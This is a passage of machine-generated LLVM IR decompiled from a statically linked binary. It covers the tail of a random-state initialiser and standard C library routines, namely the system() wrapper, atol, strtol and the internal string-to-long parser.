  %v7_158b8 = icmp eq i32 %arg2, 255
  %v2_158bc = xor i1 %v7_158b8, true
  %v3_158bc = and i1 %v2_158b8, %v2_158bc
  br i1 %v3_158bc, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_158b8
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_158b8, %bb
  %v1_158f07 = phi i32 [ %v3_158a8, %dec_label_pc_158b8 ], [ 4, %bb ]
  %v2_158c0 = xor i1 %v2_158b8, true
  %v3_158c0 = or i1 %v7_158b8, %v2_158c0
  br i1 %v3_158c0, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_158c8:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_158e0, label %dec_label_pc_158d0

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158c8
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_1594c

.thread10:                                        ; preds = %dec_label_pc_158d0
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158c8
  %v2_158e0 = icmp ugt i32 %arg2, 62
  %v7_158e0 = icmp eq i32 %arg2, 63
  %v2_158e4 = xor i1 %v7_158e0, true
  %v3_158e4 = and i1 %v2_158e0, %v2_158e4
  br i1 %v3_158e4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_158e0
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_158e0, %bb22
  %v1_158f06 = phi i32 [ %v3_158a8, %dec_label_pc_158e0 ], [ 2, %bb22 ]
  %v2_158e8 = xor i1 %v2_158e0, true
  %v3_158e8 = or i1 %v7_158e0, %v2_158e8
  br i1 %v3_158e8, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_158f8 = phi i32 [ 3, %bb21 ], [ %v1_158f07, %bb20 ], [ %v1_158f06, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_23ec4.1199 to i32), i32* %r2.global-to-local, align 4
  %v4_158f0 = mul i32 %v1_158f8, 4
  %v5_158f0 = add i32 %v4_158f0, ptrtoint (i32* @global_var_23ec4.1199 to i32)
  store i32 %v5_158f0, i32* %r3.global-to-local, align 4
  %v1_158f4 = add i32 %v4_158f0, add (i32 ptrtoint (i32* @global_var_23ec4.1199 to i32), i32 20)
  %v2_158f4 = inttoptr i32 %v1_158f4 to i32*
  %v3_158f4 = load i32, i32* %v2_158f4, align 4
  store i32 %v3_158f4, i32* %r1.global-to-local, align 4
  %v6_158f8 = inttoptr i32 %v5_158f0 to i32*
  %v7_158f8 = load i32, i32* %v6_158f8, align 4
  store i32 %v7_158f8, i32* %r2.global-to-local, align 4
  %v1_158fc = add i32 %tmp, 4
  store i32 %v1_158fc, i32* @r6, align 4
  %v4_15900 = mul i32 %v3_158f4, 4
  %v5_15900 = add i32 %v4_15900, %v1_158fc
  store i32 %v5_15900, i32* %r3.global-to-local, align 4
  %v2_15904 = add i32 %arg3, 24
  %v3_15904 = inttoptr i32 %v2_15904 to i32*
  store i32 %v5_15900, i32* %v3_15904, align 4
  %v0_15908 = load i32, i32* %r2.global-to-local, align 4
  %v1_15908 = load i32, i32* @r5, align 4
  %v2_15908 = add i32 %v1_15908, 20
  %v3_15908 = inttoptr i32 %v2_15908 to i32*
  store i32 %v0_15908, i32* %v3_15908, align 4
  %v0_1590c = load i32, i32* %r1.global-to-local, align 4
  %v1_1590c = load i32, i32* @r5, align 4
  %v2_1590c = add i32 %v1_1590c, 16
  %v3_1590c = inttoptr i32 %v2_1590c to i32*
  store i32 %v0_1590c, i32* %v3_1590c, align 4
  %v0_15910 = load i32, i32* @r4, align 4
  %v1_15910 = load i32, i32* @r5, align 4
  %v2_15910 = add i32 %v1_15910, 12
  %v3_15910 = inttoptr i32 %v2_15910 to i32*
  store i32 %v0_15910, i32* %v3_15910, align 4
  %v0_15914 = load i32, i32* @r6, align 4
  %v1_15914 = load i32, i32* @r5, align 4
  %v2_15914 = add i32 %v1_15914, 8
  %v3_15914 = inttoptr i32 %v2_15914 to i32*
  store i32 %v0_15914, i32* %v3_15914, align 4
  %v0_15918 = load i32, i32* @r5, align 4
  store i32 %v0_15918, i32* %r1.global-to-local, align 4
  %v0_1591c = load i32, i32* @r0, align 4
  %v2_1591c = inttoptr i32 %v0_1591c to i32*
  %v3_1591c = call i32 @srandom_r(i32* %v2_1591c, i32 %v0_15918)
  store i32 %v3_1591c, i32* %r0.global-to-local, align 4
  %v0_15920 = load i32, i32* @r4, align 4
  %v2_15920 = icmp eq i32 %v0_15920, 0
  br i1 %v2_15920, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1593c12 = load i32, i32* @r7, align 4
  %v2_1593c13 = inttoptr i32 %v1_1593c12 to i32*
  store i32 0, i32* %v2_1593c13, align 4
  %v1_15940 = load i32, i32* @r4, align 4
  store i32 %v1_15940, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_15924 = load i32, i32* @r5, align 4
  %v2_15924 = add i32 %v1_15924, 4
  %v3_15924 = inttoptr i32 %v2_15924 to i32*
  %v4_15924 = load i32, i32* %v3_15924, align 4
  %v1_15928 = load i32, i32* @r6, align 4
  %v3_15928 = sub i32 %v4_15924, %v1_15928
  %v4_1592c = sdiv i32 %v3_15928, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_15934 = mul i32 %v4_1592c, 5
  %v5_15934 = add i32 %v4_15934, %v0_15920
  store i32 %v5_15934, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1593c = load i32, i32* @r7, align 4
  %v2_1593c = inttoptr i32 %v1_1593c to i32*
  store i32 0, i32* %v2_1593c, align 4
  %v1_15944 = load i32, i32* %r3.global-to-local, align 4
  %v2_15944 = load i32, i32* @r7, align 4
  %v3_15944 = inttoptr i32 %v2_15944 to i32*
  store i32 %v1_15944, i32* %v3_15944, align 4
  %v17_15948.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_15948 = phi i32 [ %v1_15940, %bb26 ], [ %v17_15948.pre, %.thread4 ]
  %v2_15948 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15948, i32* %r4.global-to-local, align 4
  ret i32 %v17_15948

dec_label_pc_1594c:                               ; preds = %dec_label_pc_158d0
  %v0_1594c = call i32 @__errno_location()
  store i32 %v0_1594c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_15954 = inttoptr i32 %v0_1594c to i32*
  store i32 22, i32* %v2_15954, align 4
  %v0_15958 = call i32 @__errno_location()
  %v0_1595c = load i32, i32* %r4.global-to-local, align 4
  %v2_1595c = inttoptr i32 %v0_15958 to i32*
  store i32 %v0_1595c, i32* %v2_1595c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15964 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15964, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_158e0, { 1, 0 }
  uselistorder i1 %v7_158b8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23ec4.1199 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23ec4.1199 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1596c = load i32, i32* @r4, align 4
  %v0_15970 = load i32, i32* %r0.global-to-local, align 4
  %v2_15970 = icmp eq i32 %v0_15970, 0
  br i1 %v2_15970, label %bb, label %dec_label_pc_15984

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a90

dec_label_pc_15984:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1598c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1599c = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_159ac = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_159ac, i32* %r0.global-to-local, align 4
  %v0_159b4 = call i32 @__vfork()
  store i32 %v0_159b4, i32* %r0.global-to-local, align 4
  store i32 %v0_159b4, i32* @r4, align 4
  %v1_159b8 = icmp slt i32 %v0_159b4, 0
  br i1 %v1_159b8, label %dec_label_pc_159c0, label %dec_label_pc_159ec

dec_label_pc_159c0:                               ; preds = %dec_label_pc_15984
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_159c8 = call i32 @__bsd_signal(i32 3, i32 %v2_1598c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_159d4 = call i32 @__bsd_signal(i32 2, i32 %v2_1599c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_159e0 = call i32 @__bsd_signal(i32 17, i32 %v2_159ac)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a90

dec_label_pc_159ec:                               ; preds = %dec_label_pc_15984
  %v2_159b8 = icmp eq i32 %v0_159b4, 0
  br i1 %v2_159b8, label %dec_label_pc_159f0, label %dec_label_pc_15a34

dec_label_pc_159f0:                               ; preds = %dec_label_pc_159ec
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_159f8 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_159fc = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15a04 = call i32 @__bsd_signal(i32 2, i32 %v0_159fc)
  %v0_15a08 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_15a10 = call i32 @__bsd_signal(i32 17, i32 %v0_15a08)
  store i32 ptrtoint ([8 x i8]* @global_var_23eec.1207 to i32), i32* @r0, align 4
  %v0_15a24 = load i32, i32* @r4, align 4
  %v8_15a28 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_23eec.1207 to i32), i32 ptrtoint ([3 x i8]* @global_var_23ef4.1209 to i32), i32 ptrtoint ([3 x i8]* @global_var_23ef8.1211 to i32), i32 %v0_15970, i32 %v0_15a24)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_15a30 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_15a34:                               ; preds = %dec_label_pc_159ec
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_15a3c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15a48 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_15a58 = load i32, i32* @r4, align 4
  store i32 %v0_15a58, i32* %r0.global-to-local, align 4
  %v0_15a5c = call i32 @wait4()
  store i32 %v0_15a5c, i32* %r0.global-to-local, align 4
  %v7_15a60 = icmp eq i32 %v0_15a5c, -1
  br i1 %v7_15a60, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_15a34
  store i32 %v0_15a5c, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_15a34, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_15a70 = call i32 @__bsd_signal(i32 3, i32 %v2_1598c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15a7c = call i32 @__bsd_signal(i32 2, i32 %v2_1599c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_15a88 = call i32 @__bsd_signal(i32 17, i32 %v2_159ac)
  %v3_15a8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15a8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %bb, %dec_label_pc_159c0, %bb11
  %v8_15a94 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_159c0 ], [ %v3_15a8c, %bb11 ]
  store i32 %v3_1596c, i32* @r4, align 4
  ret i32 %v8_15a94

; uselistorder directives
  uselistorder i32 %v0_15a5c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_15a90, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_15aac = call i32 @strtol()
  ret i32 %v0_15aac
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_15ab4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_15ab4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15ab8 = load i32, i32* @r4, align 4
  store i32 %v3_15ab8, i32* %stack_var_-36, align 4
  %v0_15abc = load i32, i32* @r1, align 4
  store i32 %v0_15abc, i32* %sb.global-to-local, align 4
  %v0_15ac0 = load i32, i32* @r2, align 4
  store i32 %v0_15ac0, i32* %r5.global-to-local, align 4
  %v0_15ac4 = load i32, i32* @r3, align 4
  store i32 %v0_15ac4, i32* %fp.global-to-local, align 4
  %v0_15ac8 = load i32, i32* @r0, align 4
  %v2_15adc.pre = load i32, i32* @global_var_2c58c, align 4
  br label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15ad4, %entry
  %v0_15b0c = phi i32 [ %v0_15ac8, %entry ], [ %v1_15ad0, %dec_label_pc_15ad4 ]
  store i32 %v0_15b0c, i32* %r4.global-to-local, align 4
  %v1_15ad8 = inttoptr i32 %v0_15b0c to i8*
  %v2_15ad8 = load i8, i8* %v1_15ad8, align 1
  %v3_15ad8 = zext i8 %v2_15ad8 to i32
  store i32 %v3_15ad8, i32* @r2, align 4
  %v3_15ae0 = mul nuw nsw i32 %v3_15ad8, 2
  %v4_15ae0 = add i32 %v3_15ae0, %v2_15adc.pre
  %v5_15ae0 = inttoptr i32 %v4_15ae0 to i8*
  %v6_15ae0 = load i8, i8* %v5_15ae0, align 1
  %v1_15ae4 = and i8 %v6_15ae0, 32
  %v2_15ae4 = icmp eq i8 %v1_15ae4, 0
  %v1_15ad0 = add i32 %v0_15b0c, 1
  br i1 %v2_15ae4, label %dec_label_pc_15aec, label %dec_label_pc_15ad4

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15ad4
  %v7_15aec = icmp eq i8 %v2_15ad8, 43
  br i1 %v7_15aec, label %dec_label_pc_15b0c, label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15aec
  %v7_15af4 = icmp eq i8 %v2_15ad8, 45
  br i1 %v7_15af4, label %dec_label_pc_15b0c, label %bb

bb:                                               ; preds = %dec_label_pc_15af4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b10

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15aec, %dec_label_pc_15af4
  %storemerge43 = phi i32 [ 1, %dec_label_pc_15af4 ], [ 0, %dec_label_pc_15aec ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_15ad0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %bb, %dec_label_pc_15b0c
  %v0_15b30 = phi i32 [ %v0_15b0c, %bb ], [ %v1_15ad0, %dec_label_pc_15b0c ]
  %v1_15b10 = and i32 %v0_15ac0, -17
  %v3_15b10 = icmp eq i32 %v1_15b10, 0
  br i1 %v3_15b10, label %dec_label_pc_15b1c, label %bb54

bb54:                                             ; preds = %dec_label_pc_15b10
  br label %bb58

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b10
  %v1_15b1c = inttoptr i32 %v0_15b30 to i8*
  %v2_15b1c = load i8, i8* %v1_15b1c, align 1
  %v7_15b20 = icmp eq i8 %v2_15b1c, 48
  %v1_15b24 = add i32 %v0_15ac0, 10
  store i32 %v1_15b24, i32* %r5.global-to-local, align 4
  br i1 %v7_15b20, label %dec_label_pc_15b30, label %bb55

bb55:                                             ; preds = %dec_label_pc_15b1c
  br label %.thread8

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b1c
  %v1_15b30 = add i32 %v0_15b30, 1
  %v2_15b30 = inttoptr i32 %v1_15b30 to i8*
  %v3_15b30 = load i8, i8* %v2_15b30, align 1
  %v4_15b30 = zext i8 %v3_15b30 to i32
  store i32 %v1_15b30, i32* %r4.global-to-local, align 4
  %v1_15b34 = or i32 %v4_15b30, 32
  %v7_15b38 = icmp eq i32 %v1_15b34, 120
  %v1_15b3c = add i32 %v0_15ac0, 8
  store i32 %v1_15b3c, i32* %r5.global-to-local, align 4
  br i1 %v7_15b38, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_15b30
  %v3_15b48 = mul i32 %v1_15b3c, 2
  store i32 %v3_15b48, i32* %r5.global-to-local, align 4
  %v2_15b4c = add i32 %v0_15b30, 2
  store i32 %v2_15b4c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15b30, %bb55, %bb56
  %v1_15c1028 = phi i32 [ %v0_15ac8, %bb55 ], [ %v1_15b30, %bb56 ], [ %v1_15b30, %dec_label_pc_15b30 ]
  %v0_15b9819 = phi i32 [ %v0_15b30, %bb55 ], [ %v2_15b4c, %bb56 ], [ %v1_15b30, %dec_label_pc_15b30 ]
  %v0_15b50 = phi i32 [ %v1_15b24, %bb55 ], [ %v3_15b48, %bb56 ], [ %v1_15b3c, %dec_label_pc_15b30 ]
  %v5_15b54 = icmp slt i32 %v0_15b50, 16
  br i1 %v5_15b54, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_15c1027 = phi i32 [ %v0_15ac8, %bb54 ], [ %v1_15c1028, %.thread8 ], [ %v1_15c1028, %bb57 ]
  %v0_15b9818 = phi i32 [ %v0_15b30, %bb54 ], [ %v0_15b9819, %.thread8 ], [ %v0_15b9819, %bb57 ]
  %v0_15b68 = phi i32 [ %v0_15ac0, %bb54 ], [ %v0_15b50, %.thread8 ], [ 16, %bb57 ]
  %v1_15b58 = add i32 %v0_15b68, -2
  %tmp = icmp ugt i32 %v1_15b58, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_15b68

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15b68:                               ; preds = %bb58
  %v2_15b70 = urem i32 -1, %v0_15b68
  %v1_15b80 = urem i32 %v2_15b70, 256
  store i32 %v1_15b80, i32* %sl.global-to-local, align 4
  %v2_15b84 = udiv i32 -1, %v0_15b68
  store i32 0, i32* @ip, align 4
  store i32 %v2_15b84, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15b98

dec_label_pc_15b94:                               ; preds = %bb65, %dec_label_pc_15bf4
  %v0_15b94 = phi i32 [ %v1_15bc4, %bb65 ], [ %v0_15b94.pre, %dec_label_pc_15bf4 ]
  br label %dec_label_pc_15b98

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b68, %dec_label_pc_15b94
  %v1_15c1025 = phi i32 [ %v1_15c1027, %dec_label_pc_15b68 ], [ %v0_15b94, %dec_label_pc_15b94 ]
  %v0_15bc4 = phi i32 [ %v0_15b9818, %dec_label_pc_15b68 ], [ %v0_15b94, %dec_label_pc_15b94 ]
  %v1_15b98 = inttoptr i32 %v0_15bc4 to i8*
  %v2_15b98 = load i8, i8* %v1_15b98, align 1
  %v3_15b98 = zext i8 %v2_15b98 to i32
  %v1_15b9c = add nsw i32 %v3_15b98, -48
  %v1_15ba0 = urem i32 %v1_15b9c, 256
  %v1_15ba8 = or i32 %v3_15b98, 32
  store i32 %v1_15ba8, i32* @r2, align 4
  %tmp73 = icmp ult i32 %v1_15ba0, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_15bb0

dec_label_pc_15bb0:                               ; preds = %dec_label_pc_15b98
  %v1_15bb4 = add nsw i32 %v1_15ba8, -87
  store i32 %v1_15bb4, i32* @r2, align 4
  %tmp74 = icmp ugt i32 %v1_15ba8, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_15bb0
  %v5_15bbc = urem i32 %v1_15bb4, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_15b98, %dec_label_pc_15bb0, %bb59
  %v3_15bec = phi i32 [ %v1_15ba0, %dec_label_pc_15b98 ], [ 40, %dec_label_pc_15bb0 ], [ %v5_15bbc, %bb59 ]
  %v1_15bc0 = load i32, i32* %r5.global-to-local, align 4
  %v1_15bc4 = add i32 %v0_15bc4, 1
  store i32 %v1_15bc4, i32* %r4.global-to-local, align 4
  %v6_15bc8 = icmp slt i32 %v3_15bec, %v1_15bc0
  br i1 %v6_15bc8, label %dec_label_pc_15bcc, label %dec_label_pc_15c0c.loopexit

dec_label_pc_15bcc:                               ; preds = %bb60
  %v0_15bcc = load i32, i32* @ip, align 4
  %v1_15bcc = load i32, i32* %r8.global-to-local, align 4
  %v9_15bcc = icmp eq i32 %v0_15bcc, %v1_15bcc
  br i1 %v9_15bcc, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_15bcc
  br label %dec_label_pc_15bdc

bb61:                                             ; preds = %dec_label_pc_15bcc
  %v3_15bcc = icmp ult i32 %v0_15bcc, %v1_15bcc
  br i1 %v3_15bcc, label %dec_label_pc_15bdc, label %dec_label_pc_15bf4

dec_label_pc_15bdc:                               ; preds = %bb61, %.thread37
  %v4_15be42240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_15bdc = load i32, i32* %sl.global-to-local, align 4
  %v3_15bdc = icmp uge i32 %v3_15bec, %v1_15bdc
  %v9_15bdc = icmp eq i32 %v3_15bec, %v1_15bdc
  %v2_15be0 = xor i1 %v3_15bdc, true
  %v3_15be0 = or i1 %v9_15bdc, %v2_15be0
  br i1 %v3_15be0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_15bdc
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_15bdc, %bb62
  %v4_15be4 = phi i32 [ %v4_15be42240, %dec_label_pc_15bdc ], [ 0, %bb62 ]
  %v2_15be4 = xor i1 %v9_15bdc, true
  %v3_15be4 = and i1 %v3_15bdc, %v2_15be4
  br i1 %v3_15be4, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_15be4 = urem i32 %v4_15be4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_15be8 = phi i32 [ %v5_15be4, %bb64 ], [ %v4_15be4, %bb63 ]
  %v2_15be8 = icmp eq i32 %v0_15be8, 0
  br i1 %v2_15be8, label %bb65, label %dec_label_pc_15bf4

bb65:                                             ; preds = %thread-pre-split
  %v4_15bec = mul i32 %v0_15bcc, %v1_15bc0
  %v5_15bec = add i32 %v4_15bec, %v3_15bec
  store i32 %v5_15bec, i32* @ip, align 4
  br label %dec_label_pc_15b94

dec_label_pc_15bf4:                               ; preds = %bb61, %thread-pre-split
  %v0_15bf4 = call i32 @__errno_location()
  %v0_15bf8 = load i32, i32* %r7.global-to-local, align 4
  %v1_15bf8 = load i32, i32* %fp.global-to-local, align 4
  %v2_15bf8 = and i32 %v1_15bf8, %v0_15bf8
  store i32 %v2_15bf8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_15c04 = inttoptr i32 %v0_15bf4 to i32*
  store i32 34, i32* %v2_15c04, align 4
  %v0_15b94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b94

dec_label_pc_15c0c.loopexit:                      ; preds = %bb60
  %v0_15c0c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %.thread, %dec_label_pc_15c0c.loopexit
  %v1_15c10 = phi i32 [ %v1_15c1025, %dec_label_pc_15c0c.loopexit ], [ %v1_15c1027, %.thread ]
  %v2_15c10 = phi i32 [ %v0_15c0c.pre, %dec_label_pc_15c0c.loopexit ], [ %v0_15abc, %.thread ]
  %v2_15c0c = icmp eq i32 %v2_15c10, 0
  br i1 %v2_15c0c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_15c0c
  %v3_15c10 = inttoptr i32 %v2_15c10 to i32*
  store i32 %v1_15c10, i32* %v3_15c10, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_15c0c, %bb66
  %v0_15c14 = load i32, i32* %r7.global-to-local, align 4
  %v2_15c14 = icmp eq i32 %v0_15c14, 0
  %. = select i1 %v2_15c14, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_15c20 = load i32, i32* %fp.global-to-local, align 4
  %v2_15c20 = icmp eq i32 %v0_15c20, 0
  %v0_15c44.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_15c20, label %dec_label_pc_15c3c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_15c44.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_15c2c, label %dec_label_pc_15c3c

dec_label_pc_15c2c:                               ; preds = %bb70
  %v0_15c2c = call i32 @__errno_location()
  %v2_15c34 = inttoptr i32 %v0_15c2c to i32*
  store i32 34, i32* %v2_15c34, align 4
  %v0_15c38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15c38, i32* @ip, align 4
  %v0_15c3c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %bb70, %bb67, %dec_label_pc_15c2c
  %v0_15c44.pre = phi i32 [ %v0_15c44.pre.pre, %bb70 ], [ %v0_15c38, %dec_label_pc_15c2c ], [ %v0_15c44.pre.pre, %bb67 ]
  %v0_15c3c = phi i32 [ %v0_15c14, %bb70 ], [ %v0_15c3c.pre, %dec_label_pc_15c2c ], [ %v0_15c14, %bb67 ]
  %v2_15c3c = icmp eq i32 %v0_15c3c, 0
  br i1 %v2_15c3c, label %dec_label_pc_15c3c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_15c3c
  %v2_15c40 = sub i32 0, %v0_15c44.pre
  store i32 %v2_15c40, i32* @ip, align 4
  br label %dec_label_pc_15c3c._crit_edge

dec_label_pc_15c3c._crit_edge:                    ; preds = %dec_label_pc_15c3c, %bb71
  %v0_15c44 = phi i32 [ %v2_15c40, %bb71 ], [ %v0_15c44.pre, %dec_label_pc_15c3c ]
  %v2_15c48 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15c48, i32* @r4, align 4
  ret i32 %v0_15c44

; uselistorder directives
  uselistorder i32 %v0_15c44.pre, { 1, 0 }
  uselistorder i32 %v0_15c44.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_15be4, { 1, 0 }
  uselistorder i1 %v3_15bdc, { 1, 0 }
  uselistorder i32 %v1_15bdc, { 1, 0 }
  uselistorder i32 %v1_15bc4, { 1, 0 }
  uselistorder i32 %v1_15ba0, { 1, 0 }
  uselistorder i32 %v0_15b94, { 1, 0 }
  uselistorder i32 %v0_15b68, { 1, 0, 2 }
  uselistorder i32 %v3_15b48, { 1, 0 }
  uselistorder i32 %v1_15b3c, { 1, 0, 2 }
  uselistorder i32 %v0_15b30, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_15ad0, { 1, 0, 2 }
  uselistorder i32 %v0_15ac8, { 1, 0, 2 }
  uselistorder i32 %v0_15ac0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15c3c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15c3c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
